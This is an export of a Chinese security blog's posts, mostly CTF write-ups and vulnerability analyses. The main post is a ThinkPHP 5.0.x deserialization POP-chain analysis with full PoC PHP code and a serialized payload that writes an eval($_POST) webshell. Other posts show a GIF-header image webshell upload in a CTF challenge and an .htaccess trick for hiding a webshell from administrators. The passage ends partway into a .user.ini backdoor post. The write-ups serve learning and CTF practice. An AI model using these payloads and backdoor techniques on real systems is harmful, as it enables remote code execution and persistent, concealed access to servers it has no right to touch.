<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>在根目录下运行后改为.gif</p>
<p><img src="/2021/08/06/swpuctf-2018-simplephp/image-20210808211049208.png" alt="image-20210808211049208"></p>
<pre><code>file.php?file=phar://upload/.........jpg</code></pre>
<p><img src="/2021/08/06/swpuctf-2018-simplephp/image-20210808212346510.png" alt="image-20210808212346510"></p>
<p>解码</p>
<p><img src="/2021/08/06/swpuctf-2018-simplephp/image-20210808212430464.png" alt="image-20210808212430464"></p>
]]></content>
  </entry>
  <entry>
    <title>SpringWebFlow</title>
    <url>/2021/10/10/springwebflow/</url>
    <content><![CDATA[<p><a href="https://lxh3ng.github.io/2021/10/08/he-cheng-bei-2021/">https://lxh3ng.github.io/2021/10/08/he-cheng-bei-2021/</a></p>
]]></content>
  </entry>
  <entry>
    <title>ThinkPHP5.0.18/24反序列化漏洞</title>
    <url>/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/</url>
    <content><![CDATA[<p>seay源码审计，这里是利用点**/thinkphp/library/think/cache/driver/File.php**</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/4.png" alt="image-20211108141600243"></p>
<p>从反序列化起点开始分析：</p>
<h5 id="thinkphp-library-think-process-pipes-Windows-php"><a href="#thinkphp-library-think-process-pipes-Windows-php" class="headerlink" title="thinkphp/library/think/process/pipes/Windows.php"></a>thinkphp/library/think/process/pipes/Windows.php</h5><p>__destruct方法</p>
<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/2.png" alt="image-20211108142854098"></p>
<p>调用removeFiles，跟进</p>
<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/3.png" alt="image-20211108143027678"></p>
<p>vscode中左上二可进行全局搜索</p>
<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/5.png" alt="image-20211108143117628"></p>
<h5 id="跳板利用点：thinkphp-library-think-Model-php"><a href="#跳板利用点：thinkphp-library-think-Model-php" class="headerlink" title="跳板利用点：thinkphp/library/think/Model.php"></a>跳板利用点：thinkphp/library/think/Model.php</h5><p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/6.png" alt="image-20211108143236007"></p>
<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/7.png" alt="image-20211108143300312"></p>
<p>存在三个地方可以调用__call,调试后选择第三处作为跳板</p>
<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/8.png" alt="image-20211108143610613"></p>
<pre class=" language-PHP"><code class="language-PHP">$item[$key] = $value ? $value->getAttr($attr) : null;</code></pre>
<pre class=" language-PHP"><code class="language-PHP">$modelRelation = $this->$relation();
$value         = $this->getRelationData($modelRelation);</code></pre>
<p>getRelationData</p>
<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/9.png" alt="image-20211108145213733"></p>
<p>跟进OneToOne类getBindAttr方法</p>
<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/10.png" alt="image-20211108150005998"></p>
<p>至此代码执行到<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code>就能够执行Output类__call魔术方法</p>
<h5 id="thinkphp-library-think-console-Output-php"><a href="#thinkphp-library-think-console-Output-php" class="headerlink" title="thinkphp/library/think/console/Output.php"></a>thinkphp/library/think/console/Output.php</h5><p>Output类中__call方法，调用block方法做跳板</p>
<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/11.png" alt="image-20211108142437435"></p>
<p>output类block方法</p>
<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/12.png" alt="image-20211108150404705"></p>
<p>跟进writein</p>
<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/13.png" alt="image-20211108150458498"></p>
<p>跟进Memcached类write方法</p>
<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/14.png" alt="image-20211108150621662"></p>
<p>继续跟进set</p>
<h5 id="thinkphp-library-think-cache-driver-File-php"><a href="#thinkphp-library-think-cache-driver-File-php" class="headerlink" title="thinkphp/library/think/cache/driver/File.php"></a>thinkphp/library/think/cache/driver/File.php</h5><p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/15.png" alt="image-20211108150824402"></p>
<p>发现file_put_contents函数</p>
<p>$filename<code>可控且可以利用伪协议绕过</code>exit</p>
<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/16.png" alt="image-20211108150954684"></p>
<p><code>$data</code>值比较棘手,这里有个坑，由于最后调用<code>set</code>方法中的参数来自先前调用的<code>write</code>方法</p>
<p>只能为<code>true</code>，且这里<code>$expire</code>只能为数值，这样文件内容就无法写<strong>shell</strong></p>
<p>用文章里的一张图</p>
<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/17.png" alt="image-20211108151220943"></p>
<p>跟进setTagItem，会再执行一次<code>set</code>方法，且这里文件内容<code>$value</code>通过<code>$name</code>赋值(文件名)</p>
<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/18.png" alt="image-20211108151334856"></p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$value</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=string.rot13/resource=./&lt;?cuc cucvasb();?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token variable">$value</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php</span></code></pre>
<h1 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h1><ol>
<li>thinkphp/library/think/process/pipes/Windows.php __destruct 调用removeFiles</li>
<li>removeFiles，调用file_exists触发__toString</li>
<li>thinkphp/library/think/Model.php __tostring-&gt;toJson-&gt;toArray 最终调用<code>__call</code></li>
<li>thinkphp/library/think/console/Output.php __call 调用Output类的block</li>
<li>thinkphp/library/think/console/Output.php block调用writeIn-&gt;write，最后调用$this-&gt;handle-&gt;write()，全局搜索write方法</li>
<li>thinkphp/library/think/session/driver/Memcached.php write方法调用$this-&gt;handle-&gt;set()，全局搜索set</li>
<li>thinkphp/library/think/cache/driver/File.php set调用file_put_contents写入文件，但是参数不可控，继续进入setTagItem</li>
<li>setTagItem再次调用set，此时参数可控，写入webshell</li>
</ol>
<p>使用文章里的一张图</p>
<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/1.png" alt="1"></p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token comment" spellcheck="true">//__destruct</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name">Windows</span><span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$pivot</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$pivot</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//传入Pivot类</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">//__toString Model子类</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name">Pivot</span><span class="token punctuation">{</span>
        <span class="token keyword">protected</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">,</span><span class="token variable">$hasone</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span><span class="token operator">=</span><span class="token variable">$output</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$this->parent等于Output类</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'getError'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token operator">=</span><span class="token variable">$hasone</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//$modelRelation=$this->error</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">//getModel</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name">Query</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span><span class="token operator">=</span><span class="token variable">$output</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//get_class($modelRelation->getModel()) == get_class($this->parent)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name">Output</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$styles</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$memcached</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span><span class="token operator">=</span><span class="token variable">$memcached</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">styles</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">//Relation</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name">HasOne</span><span class="token punctuation">{</span>
        <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span><span class="token operator">=</span><span class="token variable">$query</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调用Query类的getModel</span>

            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">selfRelation</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//满足条件!$modelRelation->isSelfRelation()</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//控制__call的参数$attr</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name">Memcached</span><span class="token punctuation">{</span>
        <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$this->handler等于File类</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>
        <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token string">'path'</span><span class="token operator">=</span><span class="token operator">></span> 'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php',</span>
            <span class="token string">'cache_subdir'</span><span class="token operator">=</span><span class="token operator">></span><span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token string">'prefix'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">''</span><span class="token punctuation">,</span>
            <span class="token string">'data_compress'</span><span class="token operator">=</span><span class="token operator">></span><span class="token boolean">false</span>
        <span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>


    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span> <span class="token punctuation">{</span>
    <span class="token variable">$file</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$memcached</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcached</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$output</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">(</span><span class="token variable">$memcached</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$query</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$hasone</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>HasOne</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$pivot</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">,</span><span class="token variable">$hasone</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$windows</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">(</span><span class="token variable">$pivot</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$windows</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre><code>O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00parent%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A4%3A%7Bs%3A4%3A%22path%22%3Bs%3A122%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fa.php%22%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7Ds%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3Br%3A4%3B%7Ds%3A15%3A%22%00%2A%00selfRelation%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A5%3A%22admin%22%3B%7D%7D%7D%7D%</code></pre>
<p>URLDecode</p>
<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">:</span><span class="token string">"think\process\pipes\Windows"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token string">"�think\process\pipes\Windows�files"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">:</span><span class="token string">"think\model\Pivot"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"�*�parent"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"think\console\Output"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token string">"�think\console\Output�handle"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">:</span><span class="token string">"think\session\driver\Memcached"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"�*�handler"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">23</span><span class="token punctuation">:</span><span class="token string">"think\cache\driver\File"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"�*�options"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"path"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">122</span><span class="token punctuation">:</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php";s:12:"cache_subdir";b:0;s:6:"prefix";s:0:"";s:13:"data_compress";b:0;}s:6:"�*�tag";b:1;}}s:9:"�*�styles";a:1:{i:0;s:7:"getAttr";}}s:9:"�*�append";a:1:{s:1:"a";s:8:"getError";}s:8:"�*�error";O:27:"think\model\relation\HasOne":3:{s:8:"�*�query";O:14:"think\db\Query":1:{s:8:"�*�model";r:4;}s:15:"�*�selfRelation";b:0;s:11:"�*�bindAttr";a:1:{s:1:"a";s:5:"admin";}}}}%</span></code></pre>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>由于在后续版本中Relation重构，且成为了抽象类，所以此方法无法向上兼容，仅作学习参考</p>
<p>改变其中的某些节点，可覆盖5.0.4-5.0.24版本，</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>两位学长的文章：</p>
<p><a href="https://www.anquanke.com/post/id/196364">https://www.anquanke.com/post/id/196364</a></p>
<p><a href="https://sp4zcmd.github.io/2021/08/05/Thinkphp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/">https://sp4zcmd.github.io/2021/08/05/Thinkphp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</a></p>
<h1 id="另外的poc链构造方法"><a href="#另外的poc链构造方法" class="headerlink" title="另外的poc链构造方法"></a>另外的poc链构造方法</h1><p><a href="https://blog.csdn.net/weixin_46236101/article/details/109154096">https://blog.csdn.net/weixin_46236101/article/details/109154096</a></p>
]]></content>
  </entry>
  <entry>
    <title>WUSTCTF：2020-CVMaker</title>
    <url>/2021/08/12/wustctf-2020-cvmaker/</url>
    <content><![CDATA[<p><img src="/2021/08/12/wustctf-2020-cvmaker/1.png" alt="1"></p>
<p>注册登录以后看到上传有，应该就是文件上传了</p>
<p><img src="/2021/08/12/wustctf-2020-cvmaker/2.png" alt="2"></p>
<p>合成图片马后缀改为php上传</p>
<pre><code>GIF89a&lt;?php @eval($_POST['a']);?&gt;</code></pre>
<p><img src="/2021/08/12/wustctf-2020-cvmaker/3.png" alt="3"></p>
<p><img src="/2021/08/12/wustctf-2020-cvmaker/4.png" alt="4"></p>
<p>头像前端发现上传路径</p>
<p><img src="/2021/08/12/wustctf-2020-cvmaker/5.png" alt="5"></p>
<p>蚁剑连接，根目录下看到flag</p>
<p><img src="/2021/08/12/wustctf-2020-cvmaker/6.png" alt="6"></p>
]]></content>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>Web:.htaccess文件上传后门</title>
    <url>/2021/06/16/web.htaccess-wen-jian-shang-chuan-hou-men/</url>
    <content><![CDATA[<p>htaccess是Apache服务器中的一个配置文件，可以实现网页302重定向，自定义404页面，改变文件拓展名，允许/阻止特点的用户或者目录的访问，禁止目录列表，配置默认文档等功能。</p>
<p>在这个文件里面可以选择一定的后缀名以任意想要的格式进行解析，我们可以利用它进行隐藏后门。</p>
<p>比如说，我们有一个php的环境，然后我们最终也获得了它的webshell，但是我们的马后缀过于明显，在管理员定期的检查中，他们会着重注意脚本文件的检查，这时候就会被管理员发现。此时如果我们利用了.htaccess文件，我们就可以将马的后缀改成图片格式或者其他不容易被发觉的格式，然后让此格式以php的格式进行解析，这时候图片后缀（或者其它后缀）就相当于一个php脚本，这样子就可以躲避大部分的管理员的检查。</p>
<p>我们只需要将以下代码写入.htaccess文件中即可形成解析：</p>
<pre><code>&lt;FilesMatch "jpg"&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;</code></pre>
<p>此时，即可用菜刀对图片后缀的文件进行连接。</p>
]]></content>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>Web:JSONP注入</title>
    <url>/2021/05/29/web-jsonp-zhu-ru/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/luyaran/article/details/55657266">https://blog.csdn.net/luyaran/article/details/55657266</a></p>
<p><a href="https://www.jianshu.com/p/6fd8486f6f8b">https://www.jianshu.com/p/6fd8486f6f8b</a></p>
]]></content>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>Web:.user.ini文件上传后门</title>
    <url>/2021/06/16/web.user.ini-wen-jian-shang-chuan-hou-men/</url>
    <content><![CDATA[<p>.user.ini比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法</p>
<h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p>那么什么是.user.ini？</p>
<p>这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code></p>
<p><img src="/2021/06/16/web.user.ini-wen-jian-shang-chuan-hou-men/image-20210616122024800.png" alt="image-20210616122024800"></p>
<p>其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在<a href="http://php.net/manual/zh/configuration.file.per-user.php">这里</a>又解释了：</p>
<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER['DOCUMENT_ROOT']</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
<p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
<p>这里就很清楚了，<code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p>
<p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p>
<p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
<p>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。 不过，我们可以很容易地借助<code>.user.ini</code>文件来构造一个“后门”。</p>
<p>Php配置项中有两个比较有意思的项（下图第一、四个）：</p>
